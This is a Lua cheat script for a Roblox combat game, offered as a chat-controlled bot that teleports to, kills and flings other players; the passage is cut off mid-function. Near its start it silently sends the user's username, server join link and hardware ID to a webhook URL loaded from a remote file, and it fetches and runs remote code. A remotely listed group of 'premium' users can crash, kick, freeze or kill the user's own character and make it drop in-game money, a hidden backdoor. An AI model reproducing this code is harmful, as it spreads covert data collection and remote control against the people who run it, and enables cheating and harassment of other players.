getgenv().Script = "Get Sandy for free at discord.gg/fJeSNdJr4D"
getgenv().Owner = "BerthaHilton"
getgenv().BlackScreen = false
getgenv().DisableRendering = false
getgenv().FPSCap = 60
getgenv().Guns = {"rifle", "aug", "flintlock", "lmg", "db", "flamethrower"}

local PremiumURL = "https://raw.githubusercontent.com/poclol/Premium/main/premiumusers"
local BypassPremiumURL = "https://raw.githubusercontent.com/poclol/BypassPremium/main/bypasspremiumusers"
local CodeURL = "https://raw.githubusercontent.com/poclol/Sandy/main/uwu"
local LoaderURL = "https://raw.githubusercontent.com/poclol/Sandy/main/YoGurt"
local CodesURL = "https://raw.githubusercontent.com/poclol/Sandy/main/Codes"
local WebhookFileURL = "https://raw.githubusercontent.com/poclol/Sandy/refs/heads/main/hehehe"

local Script = "Get Moon Stand for free at discord.gg/mfyCBWWExF"

local Owner = "Xrshino"
local BlackScreen = false
local DisableRendering = false
local FPSCap = 60
local Guns = {"rifle", "aug", "flintlock"}

if not game:IsLoaded() then game.Loaded:Wait() end

local player = game.Players.LocalPlayer

local http = game:GetService("HttpService")
local headers = {
    ["Content-Type"] = "application/json"
}

local jobId = game.JobId
local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. jobId

local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local hwid = RbxAnalyticsService:GetClientId()

local embed = {
    ["title"] = "Player Execution Log",
    ["color"] = 5814783,
    ["fields"] = {
        {
            ["name"] = "User",
            ["value"] = player.Name,
            ["inline"] = true
        },
        {
            ["name"] = "Display Name",
            ["value"] = player.DisplayName,
            ["inline"] = true
        },
        {
            ["name"] = "Job ID",
            ["value"] = jobId,
            ["inline"] = false
        },
        {
            ["name"] = "Join Link",
            ["value"] = string.format("[Click to Join](%s)", joinLink),
            ["inline"] = false
        },
        {
            ["name"] = "HWID",
            ["value"] = hwid,
            ["inline"] = false
        }
    },
    ["footer"] = {
        ["text"] = "Webhook Logger • Roblox"
    },
    ["timestamp"] = DateTime.now():ToIsoDate()
}

local data = {
    ["embeds"] = {embed}
}

local body = http:JSONEncode(data)

request({
    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/poclol/Sandy/refs/heads/main/hehehe"))(),
    Method = "POST",
    Headers = headers,
    Body = body
})

if Script ~= "Get Moon Stand for free at discord.gg/mfyCBWWExF" then
    game.Players.LocalPlayer:Kick("Get the new version at discord.gg/mfyCBWWExF")
    return
end

local code = loadstring(game:HttpGet("https://raw.githubusercontent.com/poclol/Sandy/refs/heads/main/uwu"))()

if code ~= "534v8y9u034v52u89y034v52u8905342cu89023c45u809lc35u48k978y064v57m89hy2534vy7892354vy78978923cyv45my8k07u3c254uk97253c34v07yh04vy923m4v028qm0y94v8m234v08kh72534vh87m9645bh89y5b46h9354v6h98vh9783ch984v2mc3" then
    return
end

if game.Players.LocalPlayer.Name == Owner then
    return
end

if game:GetService("ServerStorage"):FindFirstChild("Executed") then
    return
end

if not game.Players:FindFirstChild(Owner) then
    return
end

marker = Instance.new("BoolValue")
marker.Name = "Executed"
marker.Parent = game:GetService("ServerStorage")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

local Bots = {}

Bots[LocalPlayer.Name] = LocalPlayer.Name

local Player = Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local currentGunIndex = 1

local gunData = {
    rifle = {
        toolName = "[Rifle]",
        shopName = "[Rifle] - $1694"
    },
    aug = {
        toolName = "[AUG]",
        shopName = "[AUG] - $2131"
    },
    flintlock = {
        toolName = "[Flintlock]",
        shopName = "[Flintlock] - $1421"
    },
    lmg = {
        toolName = "[LMG]",
        shopName = "[LMG] - $4098"
    },
    db = {
        toolName = "[Double-Barrel SG]",
        shopName = "[Double-Barrel SG] - $1475"
    },
}

local RunService = game:GetService("RunService")

if DisableRendering then
    RunService:Set3dRenderingEnabled(false)
end

local Lighting = game:GetService("Lighting")

Lighting.GlobalShadows = false

for _, obj in pairs(workspace:GetDescendants()) do
    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
        obj.Enabled = false
    end
end

workspace.StreamingEnabled = true

getgenv().enabled = false
getgenv().enabled1 = false
local auraspeed = 11
local auradistance = 4
local auraangle = math.random() * math.pi * 2

local lockedTarget = nil
local grabCheckEnabled = true
local koCheckEnabled = true
local buyingInProgress = false
local buyingGunInProgress = false
local buyingMaskInProgress = false
local teleporting = false
local autodrop = false
local ragebottargets = {}
local currentTargetIndex = 1
local fakepositionconnection = nil
local automaskenabled = false
local trashtalkactive = true
local fpactive = false
local refreshingfakeposition = false
local didRefreshOnDeath = false

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local character = game.Players.LocalPlayer.Character
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Workspace = game:GetService("Workspace")
local camera = workspace.CurrentCamera
local _, y, r = camera.CFrame:ToOrientation()

getgenv().whitelist = {}
getgenv().sentryprotected = {}
getgenv().sentrywhitelisted = {}
getgenv().protectedwhitelist = {}

getgenv().protectedwhitelist[Owner] = true

local basePosition = Vector3.new(87240, 29628, -482290)

local whitelistZone = Instance.new("Part")
whitelistZone.Name = "WhitelistBeacon"
whitelistZone.Anchored = true
whitelistZone.CanCollide = true
whitelistZone.Transparency = 1
whitelistZone.Size = Vector3.new(30, 10, 30)
whitelistZone.Position = basePosition
whitelistZone.Parent = workspace

local wallFront = Instance.new("Part")
wallFront.Name = "WhitelistBeacon_WallFront"
wallFront.Anchored = true
wallFront.CanCollide = true
wallFront.Transparency = 1
wallFront.Size = Vector3.new(32, 10, 1)
wallFront.Position = basePosition + Vector3.new(0, 5, 15.5)
wallFront.Parent = workspace

local wallBack = Instance.new("Part")
wallBack.Name = "WhitelistBeacon_WallBack"
wallBack.Anchored = true
wallBack.CanCollide = true
wallBack.Transparency = 1
wallBack.Size = Vector3.new(32, 10, 1)
wallBack.Position = basePosition + Vector3.new(0, 5, -15.5)
wallBack.Parent = workspace

local wallLeft = Instance.new("Part")
wallLeft.Name = "WhitelistBeacon_WallLeft"
wallLeft.Anchored = true
wallLeft.CanCollide = true
wallLeft.Transparency = 1
wallLeft.Size = Vector3.new(1, 10, 30)
wallLeft.Position = basePosition + Vector3.new(-15.5, 5, 0)
wallLeft.Parent = workspace

local wallRight = Instance.new("Part")
wallRight.Name = "WhitelistBeacon_WallRight"
wallRight.Anchored = true
wallRight.CanCollide = true
wallRight.Transparency = 1
wallRight.Size = Vector3.new(1, 10, 30)
wallRight.Position = basePosition + Vector3.new(15.5, 5, 0)
wallRight.Parent = workspace

local roof = Instance.new("Part")
roof.Name = "WhitelistBeacon_Roof"
roof.Anchored = true
roof.CanCollide = true
roof.Transparency = 1
roof.Size = Vector3.new(32, 1, 32)
roof.Position = basePosition + Vector3.new(0, 10.5, 0)
roof.Parent = workspace

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local zoneSize = Vector3.new(20, 10, 20)
local basePosition = whitelistZone.Position
local WHITELIST_RADIUS = 20

function getRandomPositionInZone()
    local halfSize = zoneSize / 2
    local randomX = basePosition.X + math.random() * zoneSize.X - halfSize.X
    local randomZ = basePosition.Z + math.random() * zoneSize.Z - halfSize.Z
    local fixedY = basePosition.Y + halfSize.Y + 3
    return Vector3.new(randomX, fixedY, randomZ)
end

function teleportPlayerRandomly()
    local character = LocalPlayer.Character
    if not character then return end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero

    local randomPos = getRandomPositionInZone()
    hrp.CFrame = CFrame.new(randomPos)

    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end

function isPlayerNearPosition(player, position, radius)
    local char = player.Character
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end

    local distance = (hrp.Position - position).Magnitude
    return distance <= radius
end

function checkWhitelistNearPosition()
    for _, player in pairs(Players:GetPlayers()) do
        if isPlayerNearPosition(player, basePosition, WHITELIST_RADIUS) then
            if not getgenv().whitelist[player.Name] then
                getgenv().whitelist[player.Name] = true
            end
        end
    end
end

local targetPlayer = nil
local shootRunning = true
local stomponly = false
getgenv().downonly = false
local bringonly = false
local takeonly = false
local opkill = false
local summonTarget = nil
local summonMode = "middle"

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local voiding = true

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local Character = player.Character or player.CharacterAdded:Wait()
local hrp = Character:WaitForChild("HumanoidRootPart")

task.spawn(function()
    while true do
        if voiding and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            hrp.CFrame = CFrame.new(
                math.random(-999999, 999999),
                math.random(0, 999999),
                math.random(-999999, 999999)
            )
        end
        task.wait()
    end
end)

player.CharacterAdded:Connect(function(char)
    hrp = char:WaitForChild("HumanoidRootPart")
end)

Workspace.FallenPartsDestroyHeight = 0/0

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mander120/Codes/refs/heads/main/Codes"))()
end)

local hasSentKOMessage = false

local TextChatService = game:GetService("TextChatService")
local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

TextChatService.ChatWindowConfiguration.Enabled = true

function sendMessage(message)
    if textChannel and message then
        textChannel:SendAsync(message)
    end
end

local sideOffset = 10

function startFollowingTarget(senderName)
    targetPlayer = game.Players:FindFirstChild(senderName)
    if not targetPlayer then return end
end

function reloadTool()
    local player = game.Players.LocalPlayer
    local character = player.Character
    if character then
        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then
                ReplicatedStorage.MainEvent:FireServer("Reload", tool)
            end
        end
    end
end

function handleLoopKillCommand(targetName, specificBot)
    targetName = targetName:lower()
    if specificBot then
        specificBot = specificBot:lower()
    end

    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end

    for botKey, botUsername in pairs(Bots) do
        if localPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            lockedTarget = nil
            stomponly = false
            bringonly = false
            takeonly = false
            getgenv().downonly = false
            opkill = false
            voiding = false
            summonTarget = nil
            flingonly = false

            for _, targetPlayer in ipairs(Players:GetPlayers()) do
                local targetPlayerName = targetPlayer.Name:lower()
                local targetDisplayName = targetPlayer.DisplayName:lower()

                if targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true) then
                    lockedTarget = targetPlayer
                    return
                end
            end
        end
    end
end

function handleStompCommand(targetName, specificBot)
    targetName = targetName:lower()
    if specificBot then
        specificBot = specificBot:lower()
    end

    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end

    for botKey, botUsername in pairs(Bots) do
        if localPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            lockedTarget = nil
            stomponly = true
            bringonly = false
            takeonly = false
            getgenv().downonly = false
            opkill = false
            voiding = false
            summonTarget = nil
            flingonly = false

            for _, targetPlayer in ipairs(Players:GetPlayers()) do
                local targetPlayerName = targetPlayer.Name:lower()
                local targetDisplayName = targetPlayer.DisplayName:lower()

                if targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true) then
                    lockedTarget = targetPlayer
                    return
                end
            end
        end
    end
end

function handleOPKillCommand(targetName, specificBot)
    targetName = targetName:lower()
    if specificBot then
        specificBot = specificBot:lower()
    end

    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end

    for botKey, botUsername in pairs(Bots) do
        if localPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            lockedTarget = nil
            stomponly = false
            bringonly = false
            takeonly = false
            getgenv().downonly = false
            opkill = true
            voiding = false
            summonTarget = nil
            flingonly = false

            for _, targetPlayer in ipairs(Players:GetPlayers()) do
                local targetPlayerName = targetPlayer.Name:lower()
                local targetDisplayName = targetPlayer.DisplayName:lower()

                if targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true) then
                    lockedTarget = targetPlayer
                    return
                end
            end
        end
    end
end

function handleFlingCommand(targetName)
    targetName = targetName:lower()
    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end

    for botKey, botUsername in pairs(Bots) do
        if localPlayer.Name:lower() == botUsername:lower() then
            reloadTool()
            lockedTarget = nil
            stomponly = false
            bringonly = false
            takeonly = false
            getgenv().downonly = false
            opkill = false
            voiding = false
            summonTarget = nil
            flingonly = true

            for _, targetPlayer in ipairs(Players:GetPlayers()) do
                local tName = targetPlayer.Name:lower()
                local tDisplay = targetPlayer.DisplayName:lower()
                if tName:find(targetName, 1, true) or tDisplay:find(targetName, 1, true) then
                    lockedTarget = targetPlayer
                    return
                end
            end
        end
    end
end

function handleBringCommand(targetName, specificBot, senderName)
    commandSender = senderName
    targetName = targetName:lower()
    if specificBot then
        specificBot = specificBot:lower()
    end

    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end

    for botKey, botUsername in pairs(Bots) do
        if localPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            lockedTarget = nil
            stomponly = false
            bringonly = true
            takeonly = false
            getgenv().downonly = false
            opkill = false
            voiding = false
            summonTarget = nil
            flingonly = false

            for _, targetPlayer in ipairs(Players:GetPlayers()) do
                local targetPlayerName = targetPlayer.Name:lower()
                local targetDisplayName = targetPlayer.DisplayName:lower()

                if targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true) then
                    lockedTarget = targetPlayer
                    return
                end
            end
        end
    end
end

local savedTarget5 = nil

function handleTakeCommand(targetName, destinationName)
    targetName = targetName:lower()
    if destinationName then
        destinationName = destinationName:lower()
    end

    local targetPlayer = nil
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Name:lower() == targetName then
            targetPlayer = player
            break
        end
    end

    local destinationPlayer = nil
    if destinationName then
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Name:lower() == destinationName then
                destinationPlayer = player
                savedTarget5 = destinationPlayer
                break
            end
        end
    end

    for _, player in ipairs(Players:GetPlayers()) do
        local playerName = player.Name:lower()
        local playerDisplayName = player.DisplayName:lower()

        if playerName:find(targetName, 1, true) or playerDisplayName:find(targetName, 1, true) then
            targetPlayer = player
        end

        if playerName:find(destinationName, 1, true) or playerDisplayName:find(destinationName, 1, true) then
            destinationPlayer = player
        end

        if targetPlayer and destinationPlayer then
            break
        end
    end

    if targetPlayer and destinationPlayer then
        savedTarget5 = destinationPlayer

        lockedTarget = targetPlayer
        reloadTool()
        stomponly = false
        bringonly = false
        getgenv().downonly = false
        opkill = false
        voiding = false
        takeonly = true
        summonTarget = nil
        flingonly = false
    end
end

local gotoPlayer = nil
local gotoCFrame = nil

function handleGotoCommand(playerName, locationName)
    local Players = game:GetService("Players")
    local player = Players:FindFirstChild(playerName)
    if not player then return end

    locationName = locationName:lower()

    local locationCFrames = {
        rifle = CFrame.new(-265, 52, -220),
        armor = CFrame.new(-933, -25, 570),
        lmg = CFrame.new(-618, 23, -299),
        mil = CFrame.new(36, 50, -830),
        military = CFrame.new(36, 50, -830),
        rev = CFrame.new(-639, 21, -125),
        revolver = CFrame.new(-639, 21, -125),
        food = CFrame.new(-327, 23, -291),
        food2 = CFrame.new(305, 49, -622),
        roof = CFrame.new(-326, 80, -293),
        bank = CFrame.new(-467, 39, -284),
        school = CFrame.new(-587, 68, 330),
        rpg = CFrame.new(113, -27, -268),
        uphill = CFrame.new(503, 48, -591),
        downhill = CFrame.new(-563, 8, -716),
    }

    gotoCFrame = locationCFrames[locationName]
    if not gotoCFrame then return end

    gotoPlayer = player
    lockedTarget = player
    reloadTool()
    stomponly = false
    bringonly = false
    getgenv().downonly = false
    opkill = false
    voiding = false
    takeonly = true
    summonTarget = nil
    flingonly = false
end

local skyTarget = nil

function handleSkyCommand(username)
    local Players = game:GetService("Players")
    local target = Players:FindFirstChild(username)
    if not target then return end

    skyTarget = target
    lockedTarget = target

    reloadTool()
    stomponly = false
    bringonly = false
    getgenv().downonly = false
    opkill = false
    voiding = false
    takeonly = true
    summonTarget = nil
    flingonly = false
end

function handleDownCommand(targetName, specificBot)
    targetName = targetName:lower()
    if specificBot then
        specificBot = specificBot:lower()
    end

    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end

    for botKey, botUsername in pairs(Bots) do
        if localPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            lockedTarget = nil
            stomponly = false
            bringonly = false
            takeonly = false
            getgenv().downonly = true
            opkill = false
            voiding = false
            summonTarget = nil
            flingonly = false

            for _, targetPlayer in ipairs(Players:GetPlayers()) do
                local targetPlayerName = targetPlayer.Name:lower()
                local targetDisplayName = targetPlayer.DisplayName:lower()

                if targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true) then
                    lockedTarget = targetPlayer
                    return
                end
            end
        end
    end
end

function handleFixCommand(specificBot)
    if specificBot then
        specificBot = specificBot:lower()
    end

    local localPlayer = game.Players.LocalPlayer
    if not localPlayer then return end

    for botKey, botUsername in pairs(Bots) do
        if localPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end

            getgenv().enabled = false
            getgenv().enabled1 = false
            ragebottargets = {}
            lockedTarget = nil
            autodrop = false
            buyingInProgress = false
            buyingGunInProgress = false
            buyingMaskInProgress = false
            voiding = true
            summonTarget = nil
            flingonly = false
            killall = false
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
        end
    end
end

local player = game.Players.LocalPlayer
local character = player.Character
local AnimationId = "rbxassetid://507766388"

local animations = {
    {"run", "RunAnim"},
    {"walk", "WalkAnim"},
    {"jump", "JumpAnim"},
    {"fall", "FallAnim"},
    {"climb", "ClimbAnim"}
}

player.CharacterAdded:Connect(function(character)
    local animateScript = character:WaitForChild("Animate")

    for _, pair in pairs(animations) do
        local parentName, animName = pair[1], pair[2]
        local parent = animateScript:FindFirstChild(parentName)
        if parent then
            local anim = parent:FindFirstChild(animName)
            if anim then
                anim.AnimationId = AnimationId
            end
        end
    end
end)

local EMOTES = {
    ["billy bounce"] = "rbxassetid://136095999219650",
    ["zero two dance v2"] = "rbxassetid://116714406076290",
    ["jabba switchway"] = "rbxassetid://82682811348660",
    ["beat"] = "rbxassetid://133394554631338"
}

local player = game.Players.LocalPlayer
local character = player.Character
local currentTrack = nil
local emoteLoopTask = nil

function playAnimation(animId)
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid", 10)
    local animator = humanoid:WaitForChild("Animator", 10)

    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end

    local animation = Instance.new("Animation")
    animation.AnimationId = animId
    local track = animator:LoadAnimation(animation)
    track.Looped = true
    track.Priority = Enum.AnimationPriority.Action4
    track:Play()
    currentTrack = track
end

function startEmoteLoop()
    if emoteLoopTask then
        task.cancel(emoteLoopTask)
        emoteLoopTask = nil
    end

    emoteLoopTask = task.spawn(function()
        while character and character.Parent do
            local emoteIds = {}
            for _, animId in pairs(EMOTES) do
                table.insert(emoteIds, animId)
            end
            local chosenEmote = emoteIds[math.random(1, #emoteIds)]
            playAnimation(chosenEmote)
            task.wait(30)
        end
    end)
end

if character then
    startEmoteLoop()
end

player.CharacterAdded:Connect(function(newChar)
    character = newChar
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
    startEmoteLoop()
end)

function handleTeleportCommand(targetName, specificBot)
    getgenv().enabled = false
    ragebottargets = {}
    lockedTarget = nil
    voiding = true
    summonTarget = Players:FindFirstChild(targetName)
end

function handleHideCommand(specificBot)
    if specificBot then
        specificBot = specificBot:lower()
    end

    local localPlayer = game.Players.LocalPlayer
    if not localPlayer then return end

    for botKey, botUsername in pairs(Bots) do
        if localPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end

            getgenv().enabled = false
            ragebottargets = {}
            lockedTarget = nil
            voiding = true
            summonTarget = nil
            reloadTool()
        end
    end
end

task.spawn(function()
    while true do
        if getgenv().enabled and targetPlayer and player.Character and targetPlayer.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local playerHRP = player.Character:FindFirstChild("HumanoidRootPart")
            local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if playerHRP and targetHRP then
                playerHRP.Velocity = Vector3.zero
                playerHRP.RotVelocity = Vector3.zero
                playerHRP.AssemblyLinearVelocity = Vector3.zero
                playerHRP.AssemblyAngularVelocity = Vector3.zero
                auraangle = auraangle + auraspeed * RunService.RenderStepped:Wait()
                local x = math.cos(auraangle) * auradistance
                local z = math.sin(auraangle) * auradistance
                local newPos = targetHRP.Position + Vector3.new(x, 0, z)
                hrp.CFrame = CFrame.new(newPos, newPos * 2 - targetHRP.Position)
            end
        end
        task.wait()
    end
end)

local Players = game:GetService("Players")
local localPlayer = game.Players.LocalPlayer
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:FindFirstChildOfClass("Humanoid")

localPlayer.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
end)

function teleportToTarget(commandSender)
    local targetPlayer = game.Players:FindFirstChild(commandSender)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
        local myHRP = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if myHRP then
            lockedTarget = nil
            voiding = false
            summonTarget = nil
            myHRP.Velocity = Vector3.zero
            myHRP.RotVelocity = Vector3.zero
            myHRP.AssemblyLinearVelocity = Vector3.zero
            myHRP.AssemblyAngularVelocity = Vector3.zero
            myHRP.CFrame = CFrame.new(
                targetPosition.X + -5,
                targetPosition.Y,
                targetPosition.Z
            )
            myHRP.Velocity = Vector3.zero
            myHRP.RotVelocity = Vector3.zero
            myHRP.AssemblyLinearVelocity = Vector3.zero
            myHRP.AssemblyAngularVelocity = Vector3.zero
        end
    end
end

function teleportToPosition(targetPosition)
    local player = game.Players.LocalPlayer
    if not player or not player.Character then return end
    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
    hrp.CFrame = CFrame.new(targetPosition)
    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local TeleportService = game:GetService("TeleportService")

LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    character:WaitForChild("Humanoid")
end)

function equipTool(toolName)
    local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(toolName)
    if not tool then
        tool = game.Players.LocalPlayer:FindFirstChild(toolName)
    end
    if tool then
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
    end
end

local whitelistedUsers = {}
local activeListeners = {}

local TextChatService = game:GetService("TextChatService")

local premiumUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mander120/premium/refs/heads/main/premium%20acces"))()
local bypassPremiumUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mander120/bypass-prem/refs/heads/main/Bypass%20acces"))()

pcall(function()
    local everylist = {premiumUsers, bypassPremiumUsers}
    for _, list in ipairs(everylist) do
        for user, _ in pairs(list) do
            getgenv().protectedwhitelist[user] = true
        end
    end
end)

function isAuthorized(player)
    return player.Name == Owner or whitelistedUsers[player.Name]
end

function isPremium(player)
    return premiumUsers[player.UserId] == true
end

function isBypassPremium(player)
    return bypassPremiumUsers[player.UserId] == true
end

function isProtected(player)
    return isPremium(player) or isBypassPremium(player)
end

function removeOldListeners()
    for userId in pairs(activeListeners) do
        activeListeners[userId] = nil
    end
end

benxActive = false
TweenService = game:GetService("TweenService")

function startBenx(targetPlayer)
    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
    lockedTarget = nil
    voiding = false
    benxActive = true

    local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)

    task.spawn(function()
        while benxActive do
            local char = LocalPlayer.Character
            local targetChar = targetPlayer.Character

            if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                local hrp = char.HumanoidRootPart
                local targetHRP = targetChar.HumanoidRootPart

                local frontPos = targetHRP.CFrame * CFrame.new(0, 0, -1)
                local backPos = targetHRP.CFrame * CFrame.new(0, 0, -4)

                local tween1 = TweenService:Create(hrp, tweenInfo, {CFrame = frontPos})
                tween1:Play()
                tween1.Completed:Wait()

                local tween2 = TweenService:Create(hrp, tweenInfo, {CFrame = backPos})
                tween2:Play()
                tween2.Completed:Wait()
            end
            if not benxActive then break end
        end
    end)
end

function updateDisplayName(player)
    if not player.Character then return end

    local humanoid = player.Character:WaitForChild("Humanoid")
    if humanoid then
        if isPremium(player) then
            humanoid.DisplayName = "[🌟] " .. player.Name
        elseif isBypassPremium(player) then
            humanoid.DisplayName = "[💫] " .. player.Name
        end
    end
end

function setupDisplayNameListener(player)
    if player.Character then
        updateDisplayName(player)
    end

    player.CharacterAdded:Connect(function()
        task.wait(0.1)
        updateDisplayName(player)
    end)
end

function setupChatListener(player)
    if not (isAuthorized(player) or isPremium(player) or isBypassPremium(player)) then return end

    activeListeners[player.UserId] = function(msg)
        local sender = msg.TextSource and msg.TextSource.UserId and Players:GetPlayerByUserId(msg.TextSource.UserId)
        if not sender or sender ~= player then return end

        local message = msg.Text or ""
        local msgLower = message:lower()

        if isPremium(player) then
            if msgLower == "!kick ." then
                LocalPlayer:Kick(":o")
            elseif msgLower == "!freeze ." then
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.Anchored = true
                end
            elseif msgLower == "!unfreeze ." then
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.Anchored = false
                end
            elseif msgLower == "!bring ." then
                local char = LocalPlayer.Character
                local targetChar = player.Character
                if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                    lockedTarget = nil
                    voiding = false
                    local hrp = char.HumanoidRootPart
                    hrp.Velocity = Vector3.zero
                    hrp.RotVelocity = Vector3.zero
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                    char.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame
                    hrp.Velocity = Vector3.zero
                    hrp.RotVelocity = Vector3.zero
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                end
            elseif msgLower == "!crash ." then
                while true do end
            elseif msgLower == "!dropcash ." then
                ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
            elseif msgLower == "!benx ." then
                startBenx(player)
            elseif msgLower == "!unbenx ." then
                benxActive = false
            elseif msgLower == "!talk off" then
                trashtalkactive = false
            end
        end

        if isBypassPremium(player) then
            if msgLower == "!ban ." then
                LocalPlayer:Kick("PERMA-BAN")
            elseif msgLower == "!kick ." then
                LocalPlayer:Kick(":o")
            elseif msgLower == "!freeze ." then
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.Anchored = true
                end
            elseif msgLower == "!unfreeze ." then
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.Anchored = false
                end
            elseif msgLower == "!bring ." then
                local char = LocalPlayer.Character
                local targetChar = player.Character
                if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                    lockedTarget = nil
                    voiding = false
                    local hrp = char.HumanoidRootPart
                    hrp.Velocity = Vector3.zero
                    hrp.RotVelocity = Vector3.zero
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                    char.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame
                    hrp.Velocity = Vector3.zero
                    hrp.RotVelocity = Vector3.zero
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                end
            elseif msgLower == "!crash ." then
                while true do end
            elseif msgLower:match("^%!say %. (.+)$") then
                local textToSend = msgLower:match("^%-say %. (.+)$")
                sendMessage(textToSend)
            elseif msgLower == "!rejoin ." then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
            elseif msgLower == "!adropcash ." then
                autodrop = true
            elseif msgLower == "!unadropcash ." then
                autodrop = false
            elseif msgLower == "!lkill ." then
                lkill = true
                task.spawn(function()
                    while lkill do
                        local char = game.Players.LocalPlayer.Character
                        if char and char:FindFirstChild("Humanoid") then
                            char.Humanoid.Health = 0
                        end
                        task.wait(0.2)
                    end
                end)
